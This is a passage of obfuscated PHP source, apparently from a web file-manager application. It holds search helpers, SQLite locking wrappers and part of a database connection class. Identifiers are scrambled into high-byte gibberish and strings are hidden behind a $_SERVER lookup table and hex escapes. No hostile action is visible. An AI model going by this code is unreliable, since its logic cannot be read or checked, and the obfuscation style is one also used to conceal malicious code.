$”çèûŠÓ[$„ÔÀòÁ˜[419]][$„ÔÀòÁ˜[406]] > 1) { return; } $Ì¯ÙĞÏÅ = Model($„ÔÀòÁ˜[2124])->listData(); $ä”Ï§× = array(); $ÉÜ­…æ‚ = $‚‡ñöËô[$„ÔÀòÁ˜[1958]]; foreach ($Ì¯ÙĞÏÅ as $—¥²ÅÏ) { $åÂ­“ã‚ = $—¥²ÅÏ[$„ÔÀòÁ˜[32]]; $±£‰úŞ— = str_replace($„ÔÀòÁ˜[53], $„ÔÀòÁ˜[12], Pinyin::get($åÂ­“ã‚)); if (stripos($åÂ­“ã‚, $ÉÜ­…æ‚) !== !1 || stripos($±£‰úŞ—, $ÉÜ­…æ‚) !== !1) { $ä”Ï§×[] = $—¥²ÅÏ[$„ÔÀòÁ˜[452]]; } } if (!$ä”Ï§×) { return; } $•—˜¹½¡ = array($„ÔÀòÁ˜[477] => array($„ÔÀòÁ˜[7], $ä”Ï§×), $„ÔÀòÁ˜[1666] => USER_ID); $å°Ú‡Û… = Model($„ÔÀòÁ˜[479])->field($„ÔÀòÁ˜[84])->where($•—˜¹½¡)->select(); $å°Ú‡Û… = array_to_keyvalue($å°Ú‡Û…, $„ÔÀòÁ˜[12], $„ÔÀòÁ˜[84]); $©‡üÊ¬ñ = array_unique($å°Ú‡Û…); $this->_listSearchMerge($”çèûŠÓ, $‚‡ñöËô, $­¿ê ¬‹, $©‡üÊ¬ñ); } private function _listSearchDesc(&$Ç§Ô¨®ï, $÷Òº€­, $ñîîûæ¦) { $Ì¥Ñò =& $_SERVER[–Ú¬çÁ]; if (!$÷Òº€­[$Ì¥Ñò[1958]] || $Ç§Ô¨®ï[$Ì¥Ñò[419]][$Ì¥Ñò[406]] > 1) { return; } $¸îÄş» = array($Ì¥Ñò[94] => $Ì¥Ñò[503], $Ì¥Ñò[427] => array($Ì¥Ñò[436], $Ì¥Ñò[1960] . $÷Òº€­[$Ì¥Ñò[1958]] . $Ì¥Ñò[1960])); $ëèş°—Ö = !1; if ($ëèş°—Ö) { $ÏšÍšõ— = $this->listSearchChildren($÷Òº€­[$Ì¥Ñò[180]]); $ÏšÍšõ— = array_unique($ÏšÍšõ—); if (!$ÏšÍšõ—) { return; } $¸îÄş»[$Ì¥Ñò[181]] = array($Ì¥Ñò[7], $ÏšÍšõ—); } $­ĞÃõÊ¡ = Model($Ì¥Ñò[610])->field($Ì¥Ñò[181])->where($¸îÄş»)->limit(5000)->select(); $¾Ğ¯¨Û½ = array_to_keyvalue($­ĞÃõÊ¡, $Ì¥Ñò[12], $Ì¥Ñò[181]); $this->_listSearchMerge($Ç§Ô¨®ï, $÷Òº€­, $ñîîûæ¦, $¾Ğ¯¨Û½); } private function _listSearchGroupTag(&$Ñ«¥ùı§, $ééü—¶, $õ¥ÉÓ÷ù) { $ø‚¹’§• =& $_SERVER[–Ú¬çÁ]; if (!$ééü—¶[$ø‚¹’§•[1958]] || $Ñ«¥ùı§[$ø‚¹’§•[419]][$ø‚¹’§•[406]] > 1 || !$ééü—¶[$ø‚¹’§•[180]]) { return; } $ÉÜô©© = $this->sourceInfo($ééü—¶[$ø‚¹’§•[180]]); if (!$ÉÜô©© || $ÉÜô©©[$ø‚¹’§•[178]] != SourceModel::TYPE_GROUP) { return; } $ß÷’¸¦¶ = $ÉÜô©©[$ø‚¹’§•[548]]; $‹òÆ©äÃ = Model($ø‚¹’§•[2125])->get($ß÷’¸¦¶); $Ÿä€ˆ‰· = array(); $†¥Èüñ· = $ééü—¶[$ø‚¹’§•[1958]]; foreach ($‹òÆ©äÃ[$ø‚¹’§•[422]] as $‡÷®ä…Ô) { $Üêíúõ” = $‡÷®ä…Ô[$ø‚¹’§•[32]]; $ß¯‰òÁ­ = str_replace($ø‚¹’§•[53], $ø‚¹’§•[12], Pinyin::get($Üêíúõ”)); if (stripos($Üêíúõ”, $†¥Èüñ·) !== !1 || stripos($ß¯‰òÁ­, $†¥Èüñ·) !== !1) { $Ÿä€ˆ‰·[] = $‡÷®ä…Ô[$ø‚¹’§•[452]]; } } if (!$Ÿä€ˆ‰·) { return; } $ÅÕş¦Ã¼ = array($ø‚¹’§•[477] => array($ø‚¹’§•[7], $Ÿä€ˆ‰·), $ø‚¹’§•[1666] => 0, $ø‚¹’§•[33] => $ø‚¹’§•[1980] . $ß÷’¸¦¶); $ÉıËÁóÒ = Model($ø‚¹’§•[479])->field($ø‚¹’§•[84])->where($ÅÕş¦Ã¼)->select(); $ÉıËÁóÒ = array_to_keyvalue($ÉıËÁóÒ, $ø‚¹’§•[12], $ø‚¹’§•[84]); $ó¶õ›ø› = array_unique($ÉıËÁóÒ); $this->_listSearchMerge($Ñ«¥ùı§, $ééü—¶, $õ¥ÉÓ÷ù, $ó¶õ›ø›); } private function _listSearchMerge(&$Ü²İÙ¢ª, $ñ¿ÌÖ¢µ, $ÅæÃÕ™, $¤Ö²¹¬) { $Ğ‰İûÛá =& $_SERVER[–Ú¬çÁ]; if (!$¤Ö²¹¬) { return; } $œ˜ãÎìŞ = array_to_keyvalue($Ü²İÙ¢ª[$Ğ‰İûÛá[422]], $Ğ‰İûÛá[12], $Ğ‰İûÛá[181]); $„Õò®–š = array_diff($¤Ö²¹¬, $œ˜ãÎìŞ); if (!$„Õò®–š) { return; } $àÆùŞ’Ê = array($Ğ‰İûÛá[181] => array($Ğ‰İûÛá[7], $„Õò®–š)); $Ù”×‡× = $this->field($ÅæÃÕ™)->where($àÆùŞ’Ê)->select(); if (!$Ù”×‡×) { return; } $Á¹Ö¥º© = array(); foreach ($Ù”×‡× as $‡ìĞ«ê) { if ($this->_listSearchFilter($‡ìĞ«ê, $ñ¿ÌÖ¢µ)) { $Á¹Ö¥º©[] = $‡ìĞ«ê; } } $Ü²İÙ¢ª[$Ğ‰İûÛá[422]] = array_merge($Á¹Ö¥º©, $Ü²İÙ¢ª[$Ğ‰İûÛá[422]]); $Ü²İÙ¢ª[$Ğ‰İûÛá[419]][$Ğ‰İûÛá[420]] += count($Á¹Ö¥º©); } private function _listSearchFilter($¯àòõëÆ, $Æ¯¶£ñ¡) { $ê¶å–»ò =& $_SERVER[–Ú¬çÁ]; $ä‹É¦—¼ = $¯àòõëÆ[$ê¶å–»ò[462]] == $ê¶å–»ò[88]; if (!strstr($¯àòõëÆ[$ê¶å–»ò[563]], $ê¶å–»ò[50] . $Æ¯¶£ñ¡[$ê¶å–»ò[180]] . $ê¶å–»ò[50])) { return !1; } if (isset($Æ¯¶£ñ¡[$ê¶å–»ò[463]]) && $Æ¯¶£ñ¡[$ê¶å–»ò[463]] != $ê¶å–»ò[1919]) { if ($Æ¯¶£ñ¡[$ê¶å–»ò[463]] == $ê¶å–»ò[75] && !$ä‹É¦—¼) { return !1; } if ($Æ¯¶£ñ¡[$ê¶å–»ò[463]] != $ê¶å–»ò[75] && $ä‹É¦—¼) { return !1; } if (!strstr($¯àòõëÆ[$ê¶å–»ò[175]], $ê¶å–»ò[50] . $Æ¯¶£ñ¡[$ê¶å–»ò[463]] . $ê¶å–»ò[50])) { return !1; } } if (isset($Æ¯¶£ñ¡[$ê¶å–»ò[2126]]) && $Æ¯¶£ñ¡[$ê¶å–»ò[2126]] < $¯àòõëÆ[$ê¶å–»ò[76]]) { return !1; } if (isset($Æ¯¶£ñ¡[$ê¶å–»ò[2127]]) && $Æ¯¶£ñ¡[$ê¶å–»ò[2127]] > $¯àòõëÆ[$ê¶å–»ò[76]]) { return !1; } if (isset($Æ¯¶£ñ¡[$ê¶å–»ò[640]]) && $Æ¯¶£ñ¡[$ê¶å–»ò[640]] != $¯àòõëÆ[$ê¶å–»ò[506]]) { return !1; } return !0; } public function listSearchChildren($¬˜¸ÚÑá, $ƒœÇ˜ı = 5000) { $¿ÎÅÜÄÅ =& $_SERVER[–Ú¬çÁ]; $è½ëúù = array(); $¼½é©ª = $this->sourceInfo($¬˜¸ÚÑá); $‰ö¢øşƒ = array($¿ÎÅÜÄÅ[563] => array($¿ÎÅÜÄÅ[436], $¼½é©ª[$¿ÎÅÜÄÅ[563]] . $¼½é©ª[$¿ÎÅÜÄÅ[181]] . $¿ÎÅÜÄÅ[591])); $îŒßî ¬ = $this->field($¿ÎÅÜÄÅ[76])->where($‰ö¢øşƒ)->limit($ƒœÇ˜ı + 1)->select(); $äŠŠç¶é = is_array($îŒßî ¬) ? count($îŒßî ¬) : 0; if ($äŠŠç¶é > $ƒœÇ˜ı) { return $this->_listSearchChildrenNear($¬˜¸ÚÑá, $ƒœÇ˜ı); } $ô¯ŸÚÁ¸ = $this->field($¿ÎÅÜÄÅ[181])->where($‰ö¢øşƒ)->select(); $è½ëúù = array_to_keyvalue($ô¯ŸÚÁ¸, $¿ÎÅÜÄÅ[12], $¿ÎÅÜÄÅ[181]); return $è½ëúù; } private function _listSearchChildrenNear($ùÔÀÃ¹Ä, $ÙÎ¾Í÷) { $ù÷ÈÎ”½ =& $_SERVER[–Ú¬çÁ]; $»†Òª’© = array(); $ö©™±Ô = array($ù÷ÈÎ”½[180] => $ùÔÀÃ¹Ä); $öœ¼¦Ğ‹ = $this->field($ù÷ÈÎ”½[2128])->where($ö©™±Ô)->select(); $”ùÄı = array_to_keyvalue(array_filter_by_field($öœ¼¦Ğ‹, $ù÷ÈÎ”½[462], $ù÷ÈÎ”½[88]), $ù÷ÈÎ”½[12], $ù÷ÈÎ”½[181]); $»†Òª’© = array_merge($»†Òª’©, array_to_keyvalue($öœ¼¦Ğ‹, $ù÷ÈÎ”½[12], $ù÷ÈÎ”½[181])); if (!$”ùÄı) { return $»†Òª’©; } $ö©™±Ô = array($ù÷ÈÎ”½[180] => array($ù÷ÈÎ”½[7], $”ùÄı)); $öœ¼¦Ğ‹ = $this->field($ù÷ÈÎ”½[2128])->where($ö©™±Ô)->limit($ÙÎ¾Í÷)->select(); $»†Òª’© = array_merge($»†Òª’©, array_to_keyvalue($öœ¼¦Ğ‹, $ù÷ÈÎ”½[12], $ù÷ÈÎ”½[181])); $»†Òª’© = array_slice($»†Òª’©, 0, intval($ÙÎ¾Í÷)); return $»†Òª’©; } private function _listSearchBindPinyin($³ÇÒ“¿², &$·ØÔßä, &$¤†Ö˜‘) { $³ø§×ä¾ =& $_SERVER[–Ú¬çÁ]; if (!isset($³ÇÒ“¿²[$³ø§×ä¾[1958]]) || !$³ÇÒ“¿²[$³ø§×ä¾[1958]]) { return; } if (!Input::check($³ÇÒ“¿²[$³ø§×ä¾[1958]], $³ø§×ä¾[371]) || strlen($³ÇÒ“¿²[$³ø§×ä¾[1958]]) < 2) { return; } $èÓßÊçì = "\x4c\105\106\x54\x20\x4a\117\111\x4e\x20{$this->tablePrefix}\151\x6f\x5f\163\157\x75\x72\x63\x65\137\x6d\x65\164\x61\x20\x6d\145\164\141\x20\x6f\156\x20\163\157\x75\x72\143\145\56\163\157\x75\x72\143\x65\111\x44\40\75\40\155\145\x74\x61\56\163\157\x75\x72\x63\x65\111\104"; $²ºŒË§Ñ = array(); $¤†Ö˜‘ = str_replace(array($³ø§×ä¾[206], $³ø§×ä¾[53], $³ø§×ä¾[2129]), $³ø§×ä¾[12], $¤†Ö˜‘); $¤†Ö˜‘ = $³ø§×ä¾[488] . str_replace($³ø§×ä¾[50], $³ø§×ä¾[489], $¤†Ö˜‘); $ÌîÂÖÚ» = $·ØÔßä[$³ø§×ä¾[32]]; unset($·ØÔßä[$³ø§×ä¾[32]]); foreach ($·ØÔßä as $ä´àí²œ => $ƒŠ¶Û) { $²ºŒË§Ñ[$³ø§×ä¾[488] . $ä´àí²œ] = $ƒŠ¶Û; } foreach ($ÌîÂÖÚ» as $¬³ÒÁ¬Ò) { $²ºŒË§Ñ[] = array($³ø§×ä¾[493] => $¬³ÒÁ¬Ò, $³ø§×ä¾[1020] => $³ø§×ä¾[1962], array($³ø§×ä¾[2130] => $¬³ÒÁ¬Ò, $³ø§×ä¾[2131] => array($³ø§×ä¾[7], array($³ø§×ä¾[515], $³ø§×ä¾[514])))); } $this->join($èÓßÊçì); $·ØÔßä = $²ºŒË§Ñ; } private function _parseSearchWhere($ã²øäğØ) { $í˜Ó’ÁÅ =& $_SERVER[–Ú¬çÁ]; $îß²–©ß = array(); if (isset($ã²øäğØ[$í˜Ó’ÁÅ[780]]) && $ã²øäğØ[$í˜Ó’ÁÅ[780]]) { $îß²–©ß[$í˜Ó’ÁÅ[85]] = array($í˜Ó’ÁÅ[2132], $ã²øäğØ[$í˜Ó’ÁÅ[780]]); } if (isset($ã²øäğØ[$í˜Ó’ÁÅ[781]]) && $ã²øäğØ[$í˜Ó’ÁÅ[781]]) { $êáøù‡ = array($í˜Ó’ÁÅ[2133], $ã²øäğØ[$í˜Ó’ÁÅ[781]]); if ($îß²–©ß[$í˜Ó’ÁÅ[85]]) { $îß²–©ß[$í˜Ó’ÁÅ[85]] = array($îß²–©ß[$í˜Ó’ÁÅ[85]], $êáøù‡, $í˜Ó’ÁÅ[2134]); } else { $îß²–©ß[$í˜Ó’ÁÅ[85]] = $êáøù‡; } } if (isset($ã²øäğØ[$í˜Ó’ÁÅ[2126]]) && $ã²øäğØ[$í˜Ó’ÁÅ[2126]] > 0) { $îß²–©ß[$í˜Ó’ÁÅ[76]] = array($í˜Ó’ÁÅ[2132], $ã²øäğØ[$í˜Ó’ÁÅ[2126]]); } if (isset($ã²øäğØ[$í˜Ó’ÁÅ[2127]]) && $ã²øäğØ[$í˜Ó’ÁÅ[2127]]) { $êáøù‡ = array($í˜Ó’ÁÅ[2133], $ã²øäğØ[$í˜Ó’ÁÅ[2127]]); if ($îß²–©ß[$í˜Ó’ÁÅ[76]]) { $îß²–©ß[$í˜Ó’ÁÅ[76]] = array($îß²–©ß[$í˜Ó’ÁÅ[76]], $êáøù‡, $í˜Ó’ÁÅ[2134]); } else { $îß²–©ß[$í˜Ó’ÁÅ[76]] = $êáøù‡; } } if (isset($ã²øäğØ[$í˜Ó’ÁÅ[640]]) && $ã²øäğØ[$í˜Ó’ÁÅ[640]]) { $îß²–©ß[] = array($í˜Ó’ÁÅ[506] => $ã²øäğØ[$í˜Ó’ÁÅ[640]], $í˜Ó’ÁÅ[504] => $ã²øäğØ[$í˜Ó’ÁÅ[640]], $í˜Ó’ÁÅ[1020] => $í˜Ó’ÁÅ[1962]); } if (isset($ã²øäğØ[$í˜Ó’ÁÅ[463]]) && $ã²øäğØ[$í˜Ó’ÁÅ[463]]) { $ÚÂ¢ÙÛ¯ = $ã²øäğØ[$í˜Ó’ÁÅ[463]]; if ($ÚÂ¢ÙÛ¯ == $í˜Ó’ÁÅ[75]) { $îß²–©ß[$í˜Ó’ÁÅ[462]] = 1; } else { if ($ÚÂ¢ÙÛ¯ == $í˜Ó’ÁÅ[2135]) { $îß²–©ß[$í˜Ó’ÁÅ[462]] = 0; } else { if ($ÚÂ¢ÙÛ¯) { $ÚÂ¢ÙÛ¯ = is_array($ÚÂ¢ÙÛ¯) ? $ÚÂ¢ÙÛ¯ : explode($í˜Ó’ÁÅ[50], $ÚÂ¢ÙÛ¯); $îß²–©ß[$í˜Ó’ÁÅ[463]] = array($í˜Ó’ÁÅ[469], $ÚÂ¢ÙÛ¯); $îß²–©ß[$í˜Ó’ÁÅ[462]] = 0; } } } } $this->_parseSearchParent($ã²øäğØ, $îß²–©ß); if (isset($ã²øäğØ[$í˜Ó’ÁÅ[1958]]) && trim($ã²øäğØ[$í˜Ó’ÁÅ[1958]])) { $ˆç¡§ò = trim($ã²øäğØ[$í˜Ó’ÁÅ[1958]]); $ÆÀéõ³› = explode($í˜Ó’ÁÅ[53], $ˆç¡§ò); if (strlen($ˆç¡§ò) > 2 && (substr($ˆç¡§ò, 0, 1) == $í˜Ó’ÁÅ[118] && substr($ˆç¡§ò, -1) == $í˜Ó’ÁÅ[118]) || substr($ˆç¡§ò, 0, 1) == $í˜Ó’ÁÅ[58] && substr($ˆç¡§ò, -1) == $í˜Ó’ÁÅ[58]) { $ˆç¡§ò = substr($ˆç¡§ò, 1, -1); $ÆÀéõ³› = array($ˆç¡§ò); } $îß²–©ß[$í˜Ó’ÁÅ[32]] = array(array($í˜Ó’ÁÅ[590], $í˜Ó’ÁÅ[1960] . $ˆç¡§ò . $í˜Ó’ÁÅ[1960])); if (count($ÆÀéõ³›) > 1) { $îß²–©ß[$í˜Ó’ÁÅ[32]] = array(); foreach ($ÆÀéõ³› as $ÌÜÆáÑ­) { if (!trim($ÌÜÆáÑ­)) { continue; } $îß²–©ß[$í˜Ó’ÁÅ[32]][] = array($í˜Ó’ÁÅ[590], $í˜Ó’ÁÅ[1960] . trim($ÌÜÆáÑ­) . $í˜Ó’ÁÅ[1960]); } } } return $îß²–©ß; } private function _parseSearchParent($ÌÁûª¥¿, &$¨’¨Ü¿ƒ) { $ÃÈÃÎÙî =& $_SERVER[–Ú¬çÁ]; if (!isset($ÌÁûª¥¿[$ÃÈÃÎÙî[180]]) || !$ÌÁûª¥¿[$ÃÈÃÎÙî[180]]) { return; } $•¤áŞÔ‚ = $this->pathInfo($ÌÁûª¥¿[$ÃÈÃÎÙî[180]]); $ê¡ÈÊÙé = $•¤áŞÔ‚[$ÃÈÃÎÙî[180]] . $ÃÈÃÎÙî[12] === $ÃÈÃÎÙî[222]; $÷¦¬²®ß = $•¤áŞÔ‚[$ÃÈÃÎÙî[178]] == $ÃÈÃÎÙî[557]; if ($•¤áŞÔ‚[$ÃÈÃÎÙî[574]] == $ÃÈÃÎÙî[575]) { $å’é¦ñó = $this->sourceInfo($ÌÁûª¥¿[$ÃÈÃÎÙî[180]]); $•¤áŞÔ‚[$ÃÈÃÎÙî[563]] = $å’é¦ñó[$ÃÈÃÎÙî[563]]; } $¨’¨Ü¿ƒ[$ÃÈÃÎÙî[630]] = array($ÃÈÃÎÙî[590], $•¤áŞÔ‚[$ÃÈÃÎÙî[563]] . $ÌÁûª¥¿[$ÃÈÃÎÙî[180]] . $ÃÈÃÎÙî[591]); $£şªø = isset($ÌÁûª¥¿[$ÃÈÃÎÙî[1823]]) && in_array($ÃÈÃÎÙî[557], $ÌÁûª¥¿[$ÃÈÃÎÙî[1823]]); if (!$£şªø || !$÷¦¬²®ß || !$ê¡ÈÊÙé || !$•¤áŞÔ‚[$ÃÈÃÎÙî[464]]) { return; } if (!AuthModel::authCheckRoot($•¤áŞÔ‚[$ÃÈÃÎÙî[464]][$ÃÈÃÎÙî[465]])) { return; } $±°º´Âæ = $•¤áŞÔ‚[$ÃÈÃÎÙî[548]] . $ÃÈÃÎÙî[12]; if ($±°º´Âæ == $ÃÈÃÎÙî[88]) { unset($¨’¨Ü¿ƒ[$ÃÈÃÎÙî[630]]); $¨’¨Ü¿ƒ[$ÃÈÃÎÙî[178]] = self::TYPE_GROUP; return; } $‘ˆÚ­éº = Model($ÃÈÃÎÙî[564])->groupChildrenAll($±°º´Âæ); $¦í—÷Ÿı = count($‘ˆÚ­éº); if ($¦í—÷Ÿı <= 1) { return; } $ëö²ğ†ê = array($ÃÈÃÎÙî[180] => 0, $ÃÈÃÎÙî[178] => self::TYPE_GROUP, $ÃÈÃÎÙî[548] => array($ÃÈÃÎÙî[7], $‘ˆÚ­éº)); $ÔÍŸµ†× = $this->field($ÃÈÃÎÙî[2136])->where($ëö²ğ†ê)->limit($¦í—÷Ÿı)->select(); $¨’¨Ü¿ƒ[$ÃÈÃÎÙî[630]] = array(); foreach ($ÔÍŸµ†× as $ıÒÏî‘Ù) { $¨’¨Ü¿ƒ[$ÃÈÃÎÙî[630]][] = array($ÃÈÃÎÙî[590], $ÃÈÃÎÙî[573] . $ıÒÏî‘Ù[$ÃÈÃÎÙî[181]] . $ÃÈÃÎÙî[591]); } $¨’¨Ü¿ƒ[$ÃÈÃÎÙî[630]][] = $ÃÈÃÎÙî[1962]; } } goto d±ØÌŠ×„; E…ìÀø×ºÛ: class DbSqlite extends DbSqliteBase { public function query($±î©ƒÛÖ) { $êÇİ±„› =& $_SERVER[–Ú¬çÁ]; if (!CacheLock::fileLock($êÇİ±„›[13])) { return !1; } $»ïİôû¢ = parent::query($±î©ƒÛÖ); CacheLock::fileUnLock($êÇİ±„›[13]); return $»ïİôû¢; } public function execute($êªô‰ù¯) { $ÈÀ¹ÊŠÓ =& $_SERVER[–Ú¬çÁ]; if (!CacheLock::fileLock($ÈÀ¹ÊŠÓ[13])) { return !1; } $Ü‰ŸÀ’í = parent::execute($êªô‰ù¯); CacheLock::fileUnLock($ÈÀ¹ÊŠÓ[13]); return $Ü‰ŸÀ’í; } } class DbSqlite3 extends DbSqlite3Base { public function query($Úâ´şÚ¡) { $àç¾‹ü¢ =& $_SERVER[–Ú¬çÁ]; if (!CacheLock::fileLock($àç¾‹ü¢[13])) { return !1; } $Š†ôåÃ® = parent::query($Úâ´şÚ¡); CacheLock::fileUnLock($àç¾‹ü¢[13]); return $Š†ôåÃ®; } public function execute($¦ •ğì¤) { $–Ï¼êÑ­ =& $_SERVER[–Ú¬çÁ]; if (!CacheLock::fileLock($–Ï¼êÑ­[13])) { return !1; } $Ê¼ñè— = parent::execute($¦ •ğì¤); CacheLock::fileUnLock($–Ï¼êÑ­[13]); return $Ê¼ñè—; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\151\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\156\x65\x71" => "\x3c\x3e", "\x67\164" => "\76", "\145\x67\x74" => "\x3e\75", "\154\x74" => "\x3c", "\x65\x6c\164" => "\74\x3d", "\156\157\164\x6c\151\x6b\x65" => "\x4e\x4f\124\x20\x4c\111\x4b\105", "\154\151\153\x65" => "\x4c\111\x4b\105", "\151\156" => "\111\116", "\x6e\x6f\x74\151\x6e" => "\116\x4f\124\x20\x49\116", "\x6e\157\x74\x20\x69\156" => "\116\117\124\x20\111\116", "\142\145\164\167\x65\x65\x6e" => "\x42\105\x54\127\x45\105\116", "\x6e\157\164\x62\x65\164\x77\145\x65\156" => "\116\x4f\x54\40\x42\105\124\127\x45\105\116", "\x6e\x6f\x74\x20\142\145\x74\x77\145\x65\x6e" => "\x4e\117\124\40\x42\x45\124\127\x45\x45\116"); protected $selectSql = "\123\x45\x4c\105\103\x54\x25\104\x49\123\x54\x49\116\103\124\45\40\45\106\111\x45\114\104\x25\x20\x46\x52\117\115\x20\45\124\x41\x42\114\105\45\45\x4a\x4f\111\x4e\45\45\127\110\x45\x52\x45\x25\45\x47\122\117\x55\120\45\45\110\x41\126\111\x4e\107\45\x25\117\122\x44\105\122\45\45\114\x49\x4d\x49\124\45\40\x25\125\x4e\x49\117\x4e\45\x25\x43\117\x4d\x4d\x45\116\x54\x25"; protected $bind = array(); public static function getInstance() { $Äü˜ŠÕ« = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[–Ú¬çÁ][980], $Äü˜ŠÕ«); } public function factory($ìĞÃƒÒû = '') { $ÅĞÓà× =& $_SERVER[–Ú¬çÁ]; $ìĞÃƒÒû = $this->parseConfig($ìĞÃƒÒû); if (empty($ìĞÃƒÒû[$ÅĞÓà×[981]])) { think_exception(think_lang($ÅĞÓà×[982])); } $this->dbType = ucwords(strtolower($ìĞÃƒÒû[$ÅĞÓà×[981]])); $§¼¨€ö‰ = $ÅĞÓà×[983] . $this->dbType; if (class_exists($§¼¨€ö‰)) { $ÊÖÄ—‘Á = new $§¼¨€ö‰($ìĞÃƒÒû); if ($ÅĞÓà×[984] != strtolower($ìĞÃƒÒû[$ÅĞÓà×[981]])) { $ÊÖÄ—‘Á->dbType = strtoupper($this->dbType); } else { $ÊÖÄ—‘Á->dbType = $this->_getDsnType($ìĞÃƒÒû[$ÅĞÓà×[936]]); } } else { think_exception(think_lang($ÅĞÓà×[985]) . $ÅĞÓà×[986] . $§¼¨€ö‰); } return $ÊÖÄ—‘Á; } public function __call($»€ö¤º, $ˆÃŠÜ•) { if (method_exists($this, $»€ö¤º)) { return call_user_func_array(array($this, $»€ö¤º), $ˆÃŠÜ•); } } protected function _getDsnType($æ€®ˆÓì) { $€ı‘“Ñ– = explode($_SERVER[–Ú¬çÁ][4], $æ€®ˆÓì); $ÁÑ˜Ëœ = strtoupper(trim($€ı‘“Ñ–[0])); return $ÁÑ˜Ëœ; } private function parseConfig($¨×‘ âú = '') { $•§áæâ =& $_SERVER[–Ú¬çÁ]; if (!empty($¨×‘ âú) && is_string($¨×‘ âú)) { $¨×‘ âú = $this->parseDSN($¨×‘ âú); } elseif (is_array($¨×‘ âú)) { $¨×‘ âú = array_change_key_case($¨×‘ âú); $¨×‘ âú = array($•§áæâ[981] => $¨×‘ âú[$•§áæâ[987]], $•§áæâ[908] => $¨×‘ âú[$•§áæâ[988]], $•§áæâ[909] => $¨×‘ âú[$•§áæâ[989]], $•§áæâ[906] => $¨×‘ âú[$•§áæâ[990]], $•§áæâ[907] => $¨×‘ âú[$•§áæâ[991]], $•§áæâ[21] => $¨×‘ âú[$•§áæâ[992]], $•§áæâ[936] => $¨×‘ âú[$•§áæâ[993]], $•§áæâ[17] => isset($¨×‘ âú[$•§áæâ[994]]) ? $¨×‘ âú[$•§áæâ[994]] : array()); } elseif (empty($¨×‘ âú)) { if (think_config($•§áæâ[995]) && $•§áæâ[984] != strtolower(think_config($•§áæâ[996]))) { $¨×‘ âú = $this->parseDSN(think_config($•§áæâ[995])); } else { $¨×‘ âú = array($•§áæâ[981] => think_config($•§áæâ[996]), $•§áæâ[908] => think_config($•§áæâ[997]), $•§áæâ[909] => think_config($•§áæâ[998]), $•§áæâ[906] => think_config($•§áæâ[999]), $•§áæâ[907] => think_config($•§áæâ[1000]), $•§áæâ[21] => think_config($•§áæâ[299]), $•§áæâ[936] => think_config($•§áæâ[995]), $•§áæâ[17] => think_config($•§áæâ[1001])); } } return $¨×‘ âú; } protected function initConnect($•‡Üä†ó = true) { if (1 == think_config($_SERVER[–Ú¬çÁ][22])) { $this->_linkID = $this->multiConnect($•‡Üä†ó); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $›­ÅåÏ® => $Ê÷Òé÷Ç) { $this->_linkID = $Ê÷Òé÷Ç; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ä’É¸Åú = false) { $ƒ–¬ê³Ó =& $_SERVER[–Ú¬çÁ]; static $çÄûâ® = array(); static $ÜË–®ÆÓ = -1; if (empty($çÄûâ®)) { foreach ($this->config as $é‹ŒÔô => $›Ôüº–¡) { $çÄûâ®[$é‹ŒÔô] = explode($ƒ–¬ê³Ó[50], $›Ôüº–¡); } } if (think_config($ƒ–¬ê³Ó[1002])) { if ($ä’É¸Åú || think_config($ƒ–¬ê³Ó[448]) === !0) { $¬à˜ú€ù = floor(mt_rand(0, think_config($ƒ–¬ê³Ó[1003]) - 1)); $ÜË–®ÆÓ = $¬à˜ú€ù; } else { if (is_numeric(think_config($ƒ–¬ê³Ó[1004]))) { $¬à˜ú€ù = think_config($ƒ–¬ê³Ó[1004]); } else { $¬à˜ú€ù = floor(mt_rand(think_config($ƒ–¬ê³Ó[1003]), count($çÄûâ®[$ƒ–¬ê³Ó[906]]) - 1)); } } } else { $¬à˜ú€ù = floor(mt_rand(0, count($çÄûâ®[$ƒ–¬ê³Ó[906]]) - 1)); $ÜË–®ÆÓ = $¬à˜ú€ù; } $¬à˜ú€ù = $ÜË–®ÆÓ !== -1 ? $ÜË–®ÆÓ : $¬à˜ú€ù; $ü÷Å©Á° = array($ƒ–¬ê³Ó[908] => isset($çÄûâ®[$ƒ–¬ê³Ó[908]][$¬à˜ú€ù]) ? $çÄûâ®[$ƒ–¬ê³Ó[908]][$¬à˜ú€ù] : $çÄûâ®[$ƒ–¬ê³Ó[908]][0], $ƒ–¬ê³Ó[909] => isset($çÄûâ®[$ƒ–¬ê³Ó[909]][$¬à˜ú€ù]) ? $çÄûâ®[$ƒ–¬ê³Ó[909]][$¬à˜ú€ù] : $çÄûâ®[$ƒ–¬ê³Ó[909]][0], $ƒ–¬ê³Ó[906] => isset($çÄûâ®[$ƒ–¬ê³Ó[906]][$¬à˜ú€ù]) ? $çÄûâ®[$ƒ–¬ê³Ó[906]][$¬à˜ú€ù] : $çÄûâ®[$ƒ–¬ê³Ó[906]][0], $ƒ–¬ê³Ó[907] => isset($çÄûâ®[$ƒ–¬ê³Ó[907]][$¬à˜ú€ù]) ? $çÄûâ®[$ƒ–¬ê³Ó[907]][$¬à˜ú€ù] : $çÄûâ®[$ƒ–¬ê³Ó[907]][0], $ƒ–¬ê³Ó[21] => isset($çÄûâ®[$ƒ–¬ê³Ó[21]][$¬à˜ú€ù]) ? $çÄûâ®[$ƒ–¬ê³Ó[21]][$¬à˜ú€ù] : $çÄûâ®[$ƒ–¬ê³Ó[21]][0], $ƒ–¬ê³Ó[936] => isset($çÄûâ®[$ƒ–¬ê³Ó[936]][$¬à˜ú€ù]) ? $çÄûâ®[$ƒ–¬ê³Ó[936]][$¬à˜ú€ù] : $çÄûâ®[$ƒ–¬ê³Ó[936]][0], $ƒ–¬ê³Ó[17] => isset($çÄûâ®[$ƒ–¬ê³Ó[17]][$¬à˜ú€ù]) ? $çÄûâ®[$ƒ–¬ê³Ó[17]][$¬à˜ú€ù] : $çÄûâ®[$ƒ–¬ê³Ó[17]][0]); return $this->connect($ü÷Å©Á°, $¬à˜ú€ù); } public function parseDSN($Ã‚È›ã) { $Ä¥®Öô± 